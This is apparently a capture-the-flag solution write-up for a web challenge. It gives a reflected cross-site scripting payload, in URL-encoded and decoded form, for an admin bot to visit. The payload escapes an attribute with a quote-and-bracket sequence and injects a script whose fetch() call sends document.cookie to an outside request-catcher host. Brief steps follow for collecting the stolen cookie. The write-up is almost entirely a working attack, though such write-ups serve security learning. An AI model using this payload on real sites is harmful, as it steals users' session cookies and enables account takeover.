# Spoilers...

- Open `https://fadsfadsf.requestcatcher.com`

- Solve (paste into admin bot url part): `module/0?message=%22%22%3E%3Cscript%3Efetch%28%27https%3A%2F%2Ffadsfadsf.requestcatcher.com%2F%3Fcookie%3D%27%20%2B%20document.cookie%29%3C%2Fscript%3E`

  - Un-urlencoded: `module/0?message=""><script>fetch('https://fadsfadsf.requestcatcher.com/?cookie=' + document.cookie)</script>`

- Find the cookie in the url of a request sent to `https://fadsfadsf.requestcatcher.com`

- Explanation:
  - Use ""> to escape the placeholder field which only replaces the first quote and doesn't get fully escaped.
  - Make a request to a request catcher with the cookie
